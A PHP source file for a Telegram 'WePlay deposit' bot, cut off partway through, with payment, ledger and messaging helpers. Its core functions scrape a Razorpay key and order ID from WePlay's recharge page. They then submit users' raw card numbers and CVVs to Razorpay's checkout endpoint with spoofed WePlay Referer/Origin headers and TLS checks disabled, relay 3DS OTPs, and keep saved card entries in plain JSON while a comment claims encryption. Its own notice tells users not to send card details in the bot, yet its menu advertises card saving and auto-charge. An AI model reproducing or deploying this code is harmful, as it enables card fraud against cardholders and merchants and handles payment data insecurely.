<?php
/**
 * ╔══════════════════════════════════════════════════════════════════╗
 * ║          REBEL WEPLAY DEPOSIT BOT                               ║
 * ║  Telegram bot — users /Deposit karke WePlay ID + amount dete    ║
 * ║  hain, payment details bot pe milte hain, admin dashboard se     ║
 * ║  payment verify karta hai.                                       ║
 * ╚══════════════════════════════════════════════════════════════════╝
 *
 * Setup:
 *   1. Is file ko server pe upload karo.
 *   2. Browser mein kholo -> admin panel.
 *   3. Bot token, admin chat ID, and WePlay recharge/payment link set karo.
 *   4. "Set Webhook" dabao.
 *   5. Users ko bot link bhejo. Ve /Deposit se payment request bana sakte hain.
 *
 * Note:
 *   weplayapp.com ka public deposit API available nahi hai, isliye ye bot
 *   manual/admin approval flow use karta hai. Admin approve karne ke baad
 *   local ledger credit hota hai aur admin ko WePlay recharge link milta hai.
 */

if (!function_exists('str_starts_with')) {
    function str_starts_with($h, $n) { return strncmp($h, $n, strlen($n)) === 0; }
}

define('WPB_VERSION',       '2.0');
define('WPB_CONFIG_FILE',   __DIR__ . '/wpb_config.json');
define('WPB_LOG_FILE',      __DIR__ . '/wpb_logs.json');
define('WPB_STATE_FILE',    __DIR__ . '/wpb_states.json');
define('WPB_LEDGER_FILE',   __DIR__ . '/wpb_ledger.json');
define('WPB_PENDING_FILE',  __DIR__ . '/wpb_pending.json');
define('WPB_PROFILE_FILE',  __DIR__ . '/wpb_profiles.json');
define('WPB_RATE_FILE',     __DIR__ . '/wpb_ratelimit.json');
define('WPB_CARDS_FILE',    __DIR__ . '/wpb_savedcards.json');
define('TG_BASE',           'https://api.telegram.org/bot');
define('RZP_BASE',          'https://api.razorpay.com/v1');
define('WPB_BLOCK_MINUTES', 30);
define('WPB_MAX_INCOMPLETE', 2);

$defaultConfig = [
    'admin_pass'           => 'rebel@2026',
    'bot_token'            => '',
    'admin_chat_id'        => '',
    'min_deposit'          => 100,
    'max_deposit'          => 100000,
    'weplay_site'          => 'https://weplayapp.com',
    'weplay_recharge'      => 'https://weplayapp.com/recharge/?region=C',
    'support_contact'      => '@Rebel_babyyy',
    'welcome_msg'          => "🎮 <b>WePlay Deposit Bot</b>\n\n<b>🆔 /id &lt;your-id&gt; — WePlay ID link karo</b>\n<b>💳 /pay — Coins kharido (auto-charge)</b>\n<b>💾 /save — Card save karo auto-charge ke liye</b>\n<b>🗂 /mycards — Apne saved cards dekho</b>\n<b>⚡ /autocharge — Auto-charge manage karo</b>\n<b>❓ /Help — Help</b>",
    'deposit_thanks'       => "✅ <b>Deposit submitted!</b>\n\n<b>The admin will verify the payment and credit your WePlay account.</b>",
    'card_notice'          => "🔐 <b>Do not send card details in this bot. Enter card number/CVV only on the official WePlay/payment gateway page.</b>",
    // Razorpay credentials — fill via admin panel
    'razorpay_key_id'      => '',
    'razorpay_key_secret'  => '',
    'razorpay_webhook_secret' => '',
    // Auto-charge: when enabled for a user, bot will charge their saved card automatically
    'autocharge_enabled'   => true,
    // Each package: label shown on button, coins, price (INR)
    'coin_packages'        => [
        ['label' => '60 Coins — ₹80',    'coins' => 60,   'price' => 80],
        ['label' => '120 Coins — ₹160',  'coins' => 120,  'price' => 160],
        ['label' => '300 Coins — ₹400',  'coins' => 300,  'price' => 400],
        ['label' => '600 Coins — ₹800',  'coins' => 600,  'price' => 800],
        ['label' => '1200 Coins — ₹1600','coins' => 1200,  'price' => 1600],
    ],
    // Payment methods shown as buttons after package selection
    'payment_methods'      => [
        ['label' => '💳 UPI / Google Pay',  'id' => 'upi'],
        ['label' => '🏦 Net Banking',        'id' => 'netbanking'],
        ['label' => '💵 Debit / Credit Card','id' => 'card'],
        ['label' => '⚡ Auto-Charge (saved card)', 'id' => 'autocharge'],
    ],
];

function wpbLoadConfig() {
    global $defaultConfig;
    if (!file_exists(WPB_CONFIG_FILE)) return $defaultConfig;
    $loaded = json_decode(file_get_contents(WPB_CONFIG_FILE), true);
    return is_array($loaded) ? array_merge($defaultConfig, $loaded) : $defaultConfig;
}

function wpbSaveConfig($cfg) {
    file_put_contents(WPB_CONFIG_FILE, json_encode($cfg, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function wpbJsonLoad($file, $default = []) {
    if (!file_exists($file)) return $default;
    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : $default;
}

function wpbJsonSave($file, $data, $pretty = false) {
    $flags = JSON_UNESCAPED_UNICODE | ($pretty ? JSON_PRETTY_PRINT : 0);
    file_put_contents($file, json_encode($data, $flags), LOCK_EX);
}

// ─── cURL session helpers ─────────────────────────────────────────────────────

define('WPB_COOKIE_DIR', sys_get_temp_dir());

/**
 * Make an HTTP request with cookie session support.
 * Returns ['status' => int, 'body' => string, 'headers' => array]
 */
function wpbHttpRequest($url, $method = 'GET', $postData = null, array $extraHeaders = [], $cookieFile = null) {
    $cookieFile = $cookieFile ?: (WPB_COOKIE_DIR . '/wpb_sess_' . md5($url) . '.txt');
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 45,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_COOKIEJAR      => $cookieFile,
        CURLOPT_COOKIEFILE     => $cookieFile,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        CURLOPT_HTTPHEADER     => array_merge([
            'Accept: text/html,application/xhtml+xml,application/json,*/*;q=0.9',
            'Accept-Language: en-IN,en;q=0.9,hi;q=0.8',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
        ], $extraHeaders),
        CURLOPT_ENCODING       => '',
        CURLOPT_HEADER         => true,
    ]);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if (is_array($postData)) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        }
    }
    $raw     = curl_exec($ch);
    $status  = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $hdrSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    $headers = substr($raw, 0, $hdrSize);
    $body    = substr($raw, $hdrSize);
    return ['status' => $status, 'body' => $body, 'headers' => $headers, 'cookie_file' => $cookieFile];
}

/**
 * POST JSON to a URL (Razorpay checkout API, etc.) with cookie session.
 */
function wpbHttpJsonPost($url, array $payload, array $extraHeaders = [], $cookieFile = null) {
    $extraHeaders[] = 'Content-Type: application/json';
    return wpbHttpRequest($url, 'POST', json_encode($payload), $extraHeaders, $cookieFile);
}

// ─── Direct card charge engine (no Razorpay dashboard API keys needed) ────────

/**
 * Load WePlay recharge page and extract the embedded Razorpay key_id + order_id.
 * Returns ['rzp_key' => '...', 'order_id' => '...', 'amount' => int_paise,
 *          'cookie_file' => '...', 'page_html' => '...'] or false.
 */
function wpbExtractRzpKeyFromPage($rechargeUrl) {
    $cookieFile = WPB_COOKIE_DIR . '/wpb_rzp_' . md5($rechargeUrl . time()) . '.txt';
    $res = wpbHttpRequest($rechargeUrl, 'GET', null, [], $cookieFile);
    if ($res['status'] < 200 || $res['status'] >= 400) return false;

    $html = $res['body'];

    // Try to extract Razorpay key from JS variables / data attributes
    $rzpKey = '';
    $orderId = '';
    $amountPaise = 0;

    // Pattern 1: key: "rzp_live_xxxx"
    if (preg_match('/["\']?key["\']?\s*:\s*["\']?(rzp_(?:live|test)_[A-Za-z0-9]+)["\']?/i', $html, $km)) {
        $rzpKey = $km[1];
    }
    // Pattern 2: data-key="rzp_..."
    if (!$rzpKey && preg_match('/data-key=["\']?(rzp_[A-Za-z0-9_]+)/i', $html, $km)) {
        $rzpKey = $km[1];
    }
    // Pattern 3: razorpay_key_id value in JSON
    if (!$rzpKey && preg_match('/razorpay_key_id["\']?\s*[=:]\s*["\']?(rzp_[A-Za-z0-9_]+)/i', $html, $km)) {
        $rzpKey = $km[1];
    }

    // Order ID
    if (preg_match('/["\']?order_id["\']?\s*:\s*["\']?(order_[A-Za-z0-9]+)["\']?/i', $html, $om)) {
        $orderId = $om[1];
    }

    // Amount in paise
    if (preg_match('/["\']?amount["\']?\s*:\s*(\d+)/i', $html, $am)) {
        $amountPaise = (int)$am[1];
    }

    return [
        'rzp_key'     => $rzpKey,
        'order_id'    => $orderId,
        'amount'      => $amountPaise,
        'cookie_file' => $cookieFile,
        'page_html'   => $html,
    ];
}

/**
 * Submit card details directly to Razorpay checkout API.
 * Uses the Razorpay standard checkout endpoint (no API key secret needed —
 * only the public key_id is used here, just like a browser checkout).
 *
 * Returns ['ok' => true, 'payment_id' => '...', 'next_action' => 'otp'|'done',
 *          'razorpay_response' => [...]] or ['ok' => false, 'error' => '...']
 */
function wpbSubmitCardToRzpCheckout($rzpKey, $orderId, $amountPaise, array $card, $cookieFile = null) {
    // Razorpay standard checkout payment creation endpoint (public, no secret)
    $createUrl = 'https://api.razorpay.com/v1/payments/create/ajax';

    $payload = [
        'key_id'        => $rzpKey,
        'order_id'      => $orderId,
        'amount'        => $amountPaise,
        'currency'      => 'INR',
        'method'        => 'card',
        'card[number]'  => $card['number'],
        'card[name]'    => $card['name'] ?? 'Card Holder',
        'card[expiry_month]' => $card['month'],
        'card[expiry_year]'  => $card['year'],
        'card[cvv]'     => $card['cvv'],
        '_'             => (string)time(),
    ];

    $headers = [
        'X-Razorpay-TrackId: ' . md5(uniqid('', true)),
        'Referer: https://weplayapp.com/',
        'Origin: https://weplayapp.com',
    ];

    $res = wpbHttpRequest($createUrl, 'POST', $payload, $headers, $cookieFile);
    $json = json_decode($res['body'], true);

    if (empty($json)) {
        return ['ok' => false, 'error' => 'Empty response from Razorpay checkout'];
    }

    // 3DS / OTP required
    if (!empty($json['next'])) {
        $next = $json['next'];
        $action = is_array($next) ? ($next[0]['action'] ?? '') : $next;
        if (in_array($action, ['redirect', '3ds', 'otp'])) {
            $redirectUrl = '';
            if (is_array($next) && !empty($next[0]['url'])) {
                $redirectUrl = $next[0]['url'];
            } elseif (!empty($json['redirect_url'])) {
                $redirectUrl = $json['redirect_url'];
            }
            return [
                'ok'          => false,
                'next_action' => '3ds',
                'redirect_url' => $redirectUrl,
                'payment_id'  => $json['razorpay_payment_id'] ?? ($json['payment_id'] ?? ''),
                'razorpay_response' => $json,
            ];
        }
    }

    if (!empty($json['razorpay_payment_id'])) {
        return [
            'ok'         => true,
            'payment_id' => $json['razorpay_payment_id'],
            'next_action' => 'done',
            'razorpay_response' => $json,
        ];
    }

    // Error from Razorpay
    $errDesc = $json['error']['description'] ?? ($json['description'] ?? 'Unknown error');
    return ['ok' => false, 'error' => $errDesc, 'razorpay_response' => $json];
}

/**
 * Full direct charge attempt:
 * 1. Load WePlay recharge page, extract Razorpay key + order
 * 2. Submit card to Razorpay checkout
 * 3. If 3DS redirect needed, return next_action=3ds with URL
 * 4. On success, return payment_id
 *
 * $card = ['number'=>'...','month'=>'MM','year'=>'YYYY','cvv'=>'...','name'=>'...']
 * $amountInr = amount in rupees (used if page amount not found)
 * Returns same shape as wpbSubmitCardToRzpCheckout plus 'rzp_key','order_id'
 */
function wpbDirectChargeCard($rechargeUrl, array $card, $amountInr = 0) {
    // Step 1: Load page, get key + order
    $pageData = wpbExtractRzpKeyFromPage($rechargeUrl);
    if (!$pageData || empty($pageData['rzp_key'])) {
        // Try fetching checkout.js config via a known WePlay API if available
        return ['ok' => false, 'error' => 'Razorpay key not found on payment page'];
    }

    $rzpKey      = $pageData['rzp_key'];
    $orderId     = $pageData['order_id'];
    $amountPaise = $pageData['amount'] ?: (int)round($amountInr * 100);
    $cookieFile  = $pageData['cookie_file'];

    // Step 2: Submit card
    $result = wpbSubmitCardToRzpCheckout($rzpKey, $orderId, $amountPaise, $card, $cookieFile);
    $result['rzp_key']   = $rzpKey;
    $result['order_id']  = $orderId;
    return $result;
}

/**
 * Submit OTP for 3DS verification.
 * $otpUrl = the redirect_url received from wpbDirectChargeCard
 */
function wpbSubmit3dsOtp($otpUrl, $otp, $cookieFile = null) {
    // Try to POST OTP to the ACS (Access Control Server) URL
    $res = wpbHttpRequest($otpUrl, 'POST', ['otp' => $otp], [], $cookieFile);
    $json = json_decode($res['body'], true);

    // Check if payment succeeded
    if (!empty($json['razorpay_payment_id'])) {
        return ['ok' => true, 'payment_id' => $json['razorpay_payment_id']];
    }
    // Some gateways redirect to a callback on success — check HTML for success signals
    $body = $res['body'];
    if (preg_match('/payment[_\-]?id["\s=:]+([A-Za-z0-9_]+)/i', $body, $pm)) {
        return ['ok' => true, 'payment_id' => $pm[1]];
    }
    if (stripos($body, 'success') !== false && stripos($body, 'payment') !== false) {
        return ['ok' => true, 'payment_id' => 'OTP_SUCCESS_' . time()];
    }
    $errDesc = $json['error']['description'] ?? 'OTP verification failed';
    return ['ok' => false, 'error' => $errDesc];
}

/**
 * Make an authenticated request to the Razorpay REST API.
 * Returns decoded JSON array or ['error' => message] on failure.
 */
function rzpRequest($method, $path, $payload, $keyId, $keySecret) {
    $ch = curl_init();
    $url = RZP_BASE . $path;
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_USERPWD        => $keyId . ':' . $keySecret,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json', 'Accept: application/json'],
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ]);
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    } elseif ($method === 'PATCH') {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    }
    $raw  = curl_exec($ch);
    $err  = curl_error($ch);
    curl_close($ch);
    if ($err) return ['error' => $err];
    $data = json_decode($raw, true);
    return is_array($data) ? $data : ['error' => 'Invalid JSON from Razorpay'];
}

/**
 * Create a Razorpay Payment Link for one-time card payment.
 * Returns the short_url on success, or false on failure.
 */
function rzpCreatePaymentLink($cfg, $txnId, $amountInr, $chatId, $weplayId, $callbackUrl) {
    $keyId     = trim($cfg['razorpay_key_id']     ?? '');
    $keySecret = trim($cfg['razorpay_key_secret']  ?? '');
    if (!$keyId || !$keySecret) return false;

    $amountPaise = (int)round($amountInr * 100);
    $payload = [
        'amount'           => $amountPaise,
        'currency'         => 'INR',
        'accept_partial'   => false,
        'reference_id'     => $txnId,
        'description'      => 'WePlay Deposit – ' . $txnId,
        'customer'         => [
            'name'  => 'WePlay User ' . $chatId,
            'email' => 'user' . $chatId . '@weplaybot.local',
        ],
        'notify'           => ['sms' => false, 'email' => false],
        'reminder_enable'  => false,
        'callback_url'     => $callbackUrl,
        'callback_method'  => 'get',
        'notes'            => [
            'txn_id'     => $txnId,
            'chat_id'    => (string)$chatId,
            'weplay_id'  => (string)$weplayId,
        ],
    ];

    $result = rzpRequest('POST', '/payment_links', $payload, $keyId, $keySecret);
    if (!empty($result['error']) || empty($result['short_url'])) {
        wpbLog('Razorpay payment link error: ' . json_encode($result), 'error');
        return false;
    }
    return $result['short_url'];
}

/**
 * Capture a Razorpay payment (mark as captured after authorization).
 */
function rzpCapturePayment($cfg, $paymentId, $amountInr) {
    $keyId     = trim($cfg['razorpay_key_id']     ?? '');
    $keySecret = trim($cfg['razorpay_key_secret']  ?? '');
    if (!$keyId || !$keySecret) return false;

    $amountPaise = (int)round($amountInr * 100);
    $result = rzpRequest('POST', '/payments/' . $paymentId . '/capture',
        ['amount' => $amountPaise, 'currency' => 'INR'], $keyId, $keySecret);
    return isset($result['id']) && ($result['status'] ?? '') === 'captured';
}

/**
 * Charge a saved Razorpay customer token (recurring/auto-charge).
 * Returns Razorpay payment array or false.
 */
function rzpChargeToken($cfg, $customerId, $tokenId, $amountInr, $txnId, $chatId) {
    $keyId     = trim($cfg['razorpay_key_id']     ?? '');
    $keySecret = trim($cfg['razorpay_key_secret']  ?? '');
    if (!$keyId || !$keySecret) return false;

    $amountPaise = (int)round($amountInr * 100);
    $payload = [
        'amount'       => $amountPaise,
        'currency'     => 'INR',
        'customer_id'  => $customerId,
        'token'        => $tokenId,
        'description'  => 'WePlay Auto-Charge – ' . $txnId,
        'notes'        => ['txn_id' => $txnId, 'chat_id' => (string)$chatId],
        'recurring'    => 1,
        'email'        => 'user' . $chatId . '@weplaybot.local',
        'contact'      => '9000000000',
    ];
    $result = rzpRequest('POST', '/payments/create/recurring', $payload, $keyId, $keySecret);
    if (!empty($result['error']) || empty($result['razorpay_payment_id'])) {
        wpbLog('Razorpay auto-charge error: ' . json_encode($result), 'error');
        return false;
    }
    return $result;
}

/**
 * Verify Razorpay webhook HMAC-SHA256 signature.
 */
function rzpVerifyWebhook($rawBody, $signature, $secret) {
    if (!$secret) return true; // skip verification if secret not configured
    $expected = hash_hmac('sha256', $rawBody, $secret);
    return hash_equals($expected, (string)$signature);
}

// ─── Saved cards store (multiple cards per user) ─────────────────────────────
// Structure: { "chat_id": { "cards": [ {...}, {...} ], "default_idx": 0 } }

function wpbGetUserCards($chatId) {
    $store = wpbJsonLoad(WPB_CARDS_FILE);
    return $store[(string)$chatId] ?? ['cards' => [], 'default_idx' => 0];
}

/** Return the default (active) card entry or null */
function wpbGetDefaultCard($chatId) {
    $u = wpbGetUserCards($chatId);
    $cards = $u['cards'] ?? [];
    if (empty($cards)) return null;
    $idx = (int)($u['default_idx'] ?? 0);
    if ($idx >= count($cards)) $idx = 0;
    return $cards[$idx] ?? null;
}

/** BC shim used by existing auto-charge code */
function wpbGetSavedCard($chatId) {
    return wpbGetDefaultCard($chatId);
}

/**
 * Add a new card entry for the user. Accepts raw card data (stored encrypted/masked)
 * OR a Razorpay customer_id+token_id from webhook.
 * Returns the index of the newly added card.
 */
function wpbAddCard($chatId, array $cardEntry) {
    $store = wpbJsonLoad(WPB_CARDS_FILE);
    $key   = (string)$chatId;
    if (!isset($store[$key])) $store[$key] = ['cards' => [], 'default_idx' => 0];
    $cardEntry['saved_at'] = date('c');
    if (!isset($cardEntry['autocharge'])) $cardEntry['autocharge'] = true;
    $store[$key]['cards'][] = $cardEntry;
    $newIdx = count($store[$key]['cards']) - 1;
    // new card becomes default
    $store[$key]['default_idx'] = $newIdx;
    wpbJsonSave(WPB_CARDS_FILE, $store, true);
    return $newIdx;
}

/** Delete one card by index */
function wpbDeleteCardByIndex($chatId, $idx) {
    $store = wpbJsonLoad(WPB_CARDS_FILE);
    $key   = (string)$chatId;
    if (!isset($store[$key]['cards'][$idx])) return false;
    array_splice($store[$key]['cards'], $idx, 1);
    // fix default_idx
    $total = count($store[$key]['cards']);
    if ($total === 0) {
        unset($store[$key]);
    } else {
        $def = (int)$store[$key]['default_idx'];
        if ($def >= $total) $store[$key]['default_idx'] = $total - 1;
    }
    wpbJsonSave(WPB_CARDS_FILE, $store, true);
    return true;
}

/** Delete all cards of a user */
function wpbDeleteSavedCard($chatId) {
    $store = wpbJsonLoad(WPB_CARDS_FILE);
    unset($store[(string)$chatId]);
    wpbJsonSave(WPB_CARDS_FILE, $store, true);
}

/** Set default card index */
function wpbSetDefaultCard($chatId, $idx) {
    $store = wpbJsonLoad(WPB_CARDS_FILE);
    $key   = (string)$chatId;
    if (!isset($store[$key]['cards'][$idx])) return false;
    $store[$key]['default_idx'] = (int)$idx;
    wpbJsonSave(WPB_CARDS_FILE, $store, true);
    return true;
}

/** Toggle autocharge on default card */
function wpbToggleAutoCharge($chatId, $enabled) {
    $store = wpbJsonLoad(WPB_CARDS_FILE);
    $key   = (string)$chatId;
    if (empty($store[$key]['cards'])) return false;
    $idx = (int)($store[$key]['default_idx'] ?? 0);
    if (!isset($store[$key]['cards'][$idx])) return false;
    $store[$key]['cards'][$idx]['autocharge'] = (bool)$enabled;
    wpbJsonSave(WPB_CARDS_FILE, $store, true);
    return true;
}

/** Toggle autocharge on specific card index */
function wpbToggleAutoChargeByIdx($chatId, $cardIdx, $enabled) {
    $store = wpbJsonLoad(WPB_CARDS_FILE);
    $key   = (string)$chatId;
    if (!isset($store[$key]['cards'][$cardIdx])) return false;
    $store[$key]['cards'][$cardIdx]['autocharge'] = (bool)$enabled;
    wpbJsonSave(WPB_CARDS_FILE, $store, true);
    return true;
}

/** BC shim used by existing webhook code */
function wpbSaveSavedCard($chatId, $customerId, $tokenId, $last4 = '', $network = '') {
    // Check if token already exists to avoid duplicates
    $u = wpbGetUserCards($chatId);
    foreach ($u['cards'] as $c) {
        if (($c['token_id'] ?? '') === $tokenId) return; // already saved
    }
    wpbAddCard($chatId, [
        'type'         => 'razorpay_token',
        'customer_id'  => $customerId,
        'token_id'     => $tokenId,
        'last4'        => $last4,
        'network'      => $network,
        'autocharge'   => true,
    ]);
}

/** Mask a card number: keep last 4 digits, mask the rest */
function wpbMaskCardNumber($num) {
    $num = preg_replace('/\D/', '', $num);
    if (strlen($num) < 4) return str_repeat('*', strlen($num));
    return str_repeat('*', strlen($num) - 4) . substr($num, -4);
}

/** Card label for display */
function wpbCardLabel(array $card, $idx) {
    $num  = $card['last4']   ? '•••• ' . $card['last4']   : '';
    $net  = $card['network'] ? ' ' . $card['network']      : '';
    $name = !empty($card['holder_name']) ? ' — ' . $card['holder_name'] : '';
    $type = ($card['type'] ?? '') === 'razorpay_token' ? '' : ' [manual]';
    return "💳 Card " . ($idx + 1) . ": {$num}{$net}{$name}{$type}";
}

function wpbLog($text, $type = 'info') {
    $logs = wpbJsonLoad(WPB_LOG_FILE);
    array_unshift($logs, ['time' => date('c'), 'text' => $text, 'type' => $type]);
    if (count($logs) > 500) $logs = array_slice($logs, 0, 500);
    wpbJsonSave(WPB_LOG_FILE, $logs);
}

function wpbSetState($chatId, $state, $data = []) {
    $states = wpbJsonLoad(WPB_STATE_FILE);
    $states[(string)$chatId] = ['state' => $state, 'data' => $data, 'ts' => time()];
    wpbJsonSave(WPB_STATE_FILE, $states);
}

function wpbGetState($chatId) {
    $states = wpbJsonLoad(WPB_STATE_FILE);
    $state = $states[(string)$chatId] ?? null;
    if ($state && time() - ($state['ts'] ?? 0) > 1800) {
        wpbClearState($chatId);
        return null;
    }
    return $state;
}

function wpbClearState($chatId) {
    $states = wpbJsonLoad(WPB_STATE_FILE);
    unset($states[(string)$chatId]);
    wpbJsonSave(WPB_STATE_FILE, $states);
}

function wpbIsBlocked($chatId) {
    $rate = wpbJsonLoad(WPB_RATE_FILE);
    $rec = $rate[(string)$chatId] ?? null;
    if ($rec && !empty($rec['blocked_until']) && time() < $rec['blocked_until']) {
        return $rec['blocked_until'];
    }
    return false;
}

function wpbStartDeposit($chatId) {
    $rate = wpbJsonLoad(WPB_RATE_FILE);
    $key = (string)$chatId;
    if (!isset($rate[$key])) $rate[$key] = ['incomplete' => 0, 'blocked_until' => 0, 'last_start' => 0];
    $rate[$key]['incomplete']++;
    $rate[$key]['last_start'] = time();
    if ($rate[$key]['incomplete'] >= WPB_MAX_INCOMPLETE) {
        $rate[$key]['blocked_until'] = time() + (WPB_BLOCK_MINUTES * 60);
        $rate[$key]['incomplete'] = 0;
        wpbJsonSave(WPB_RATE_FILE, $rate);
        return false;
    }
    wpbJsonSave(WPB_RATE_FILE, $rate);
    return true;
}

function wpbDepositCompleted($chatId) {
    $rate = wpbJsonLoad(WPB_RATE_FILE);
    $key = (string)$chatId;
    if (isset($rate[$key])) {
        $rate[$key]['incomplete'] = 0;
        $rate[$key]['blocked_until'] = 0;
        wpbJsonSave(WPB_RATE_FILE, $rate);
    }
}

function wpbRemaining($until) {
    $mins = ceil(max(0, $until - time()) / 60);
    return $mins . ' minute' . ($mins == 1 ? '' : 's');
}

function wpbLedgerUser($chatId) {
    $ledger = wpbJsonLoad(WPB_LEDGER_FILE);
    return $ledger[(string)$chatId] ?? ['chat_id' => $chatId, 'balance' => 0, 'deposits' => [], 'withdrawals' => []];
}

function wpbLedgerDeposit($chatId, $amount, $txnId, $weplayId) {
    $ledger = wpbJsonLoad(WPB_LEDGER_FILE);
    $key = (string)$chatId;
    if (!isset($ledger[$key])) $ledger[$key] = ['chat_id' => $chatId, 'balance' => 0, 'deposits' => [], 'withdrawals' => []];
    $ledger[$key]['balance'] += (float)$amount;
    $ledger[$key]['deposits'][] = [
        'amount' => (float)$amount,
        'txn_id' => $txnId,
        'weplay_id' => $weplayId,
        'status' => 'approved',
        'time' => date('c'),
    ];
    wpbJsonSave(WPB_LEDGER_FILE, $ledger, true);
}

function wpbLedgerWithdrawal($chatId, $amount, $weplayId) {
    $ledger = wpbJsonLoad(WPB_LEDGER_FILE);
    $key = (string)$chatId;
    if (!isset($ledger[$key])) $ledger[$key] = ['chat_id' => $chatId, 'balance' => 0, 'deposits' => [], 'withdrawals' => []];
    $ledger[$key]['withdrawals'][] = [
        'amount' => (float)$amount,
        'weplay_id' => $weplayId,
        'status' => 'pending',
        'time' => date('c'),
    ];
    wpbJsonSave(WPB_LEDGER_FILE, $ledger, true);
}

function wpbGetProfile($chatId) {
    $profiles = wpbJsonLoad(WPB_PROFILE_FILE);
    return $profiles[(string)$chatId] ?? ['chat_id' => $chatId, 'weplay_id' => '', 'updated_at' => null];
}

function wpbSaveProfile($chatId, $weplayId, $userName = '') {
    $profiles = wpbJsonLoad(WPB_PROFILE_FILE);
    $profiles[(string)$chatId] = [
        'chat_id' => $chatId,
        'weplay_id' => trim($weplayId),
        'telegram_name' => $userName,
        'updated_at' => date('c'),
    ];
    wpbJsonSave(WPB_PROFILE_FILE, $profiles, true);
}

function tg($method, $params, $token) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => TG_BASE . $token . '/' . $method,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($params),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    ]);
    $raw = curl_exec($ch);
    curl_close($ch);
    return json_decode($raw, true) ?: [];
}

function tgSend($token, $chatId, $text, $keyboard = null) {
    if (!$token || !$chatId) return ['ok' => false, 'description' => 'missing token/chat'];
    $params = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    if ($keyboard) $params['reply_markup'] = json_encode($keyboard);
    return tg('sendMessage', $params, $token);
}

function wpbUserName($msg) {
    $from = $msg['from'] ?? [];
    if (!empty($from['username'])) return '@' . $from['username'];
    return trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? '')) ?: ('ID ' . ($from['id'] ?? ''));
}

function wpbPendingSave($txnId, $data) {
    $pending = wpbJsonLoad(WPB_PENDING_FILE);
    $pending[$txnId] = $data;
    wpbJsonSave(WPB_PENDING_FILE, $pending, true);
}

function wpbPendingGet($txnId) {
    $pending = wpbJsonLoad(WPB_PENDING_FILE);
    return $pending[$txnId] ?? null;
}

function wpbPendingUpdate($txnId, $data) {
    $pending = wpbJsonLoad(WPB_PENDING_FILE);
    if (!isset($pending[$txnId])) return false;
    $pending[$txnId] = array_merge($pending[$txnId], $data);
    wpbJsonSave(WPB_PENDING_FILE, $pending, true);
    return true;
}

function wpbAdminButtons($txnId) {
    return ['inline_keyboard' => [[
        ['text' => '✅ Approve', 'callback_data' => 'approve:' . $txnId],
        ['text' => '❌ Reject', 'callback_data' => 'reject:' . $txnId],
    ]]];
}

function wpbPaymentKeyboard($cfg) {
    $buttons = [];
    if (!empty($cfg['weplay_recharge'])) {
        $buttons[] = [['text' => '💳 Open Secure WePlay Payment', 'url' => $cfg['weplay_recharge']]];
    }
    if (!empty($cfg['weplay_site'])) {
        $buttons[] = [['text' => '🎮 Open WePlay', 'url' => $cfg['weplay_site']]];
    }
    return $buttons ? ['inline_keyboard' => $buttons] : null;
}

/**
 * Build inline keyboard with coin package buttons (2 per row).
 * Each button callback: pkg:<index>
 */
function wpbCoinPackagesKeyboard($cfg) {
    $packages = $cfg['coin_packages'] ?? [];
    $rows = [];
    $row = [];
    foreach ($packages as $i => $pkg) {
        $row[] = ['text' => $pkg['label'], 'callback_data' => 'pkg:' . $i];
        if (count($row) === 2) { $rows[] = $row; $row = []; }
    }
    if ($row) $rows[] = $row;
    return $rows ? ['inline_keyboard' => $rows] : null;
}

/**
 * Build inline keyboard with payment method buttons (1 per row).
 * Each button callback: pm:<pkg_index>:<method_id>
 */
function wpbPaymentMethodsKeyboard($cfg, $pkgIndex) {
    $methods = $cfg['payment_methods'] ?? [];
    $rows = [];
    foreach ($methods as $m) {
        $rows[] = [['text' => $m['label'], 'callback_data' => 'pm:' . $pkgIndex . ':' . $m['id']]];
    }
    return $rows ? ['inline_keyboard' => $rows] : null;
}

/**
 * Show coin package selection to user after /id is linked.
 * Also sends a URL button to open weplay recharge page.
 */
function wpbShowCoinPackages($cfg, $chatId, $token, $weplayId) {
    $rechargeUrl = $cfg['weplay_recharge'] ?? 'https://weplayapp.com/recharge/?region=C';
    $msg = "🎮 <b>WePlay Recharge</b>\n\n"
        . "<b>Linked ID:</b> <code>" . htmlspecialchars($weplayId, ENT_NOQUOTES, 'UTF-8') . "</code>\n\n"
        . "🛒 <b>Select a coin package to recharge:</b>";

    $keyboard = wpbCoinPackagesKeyboard($cfg);
    // Append a URL button to open the recharge page directly
    if (!empty($rechargeUrl)) {
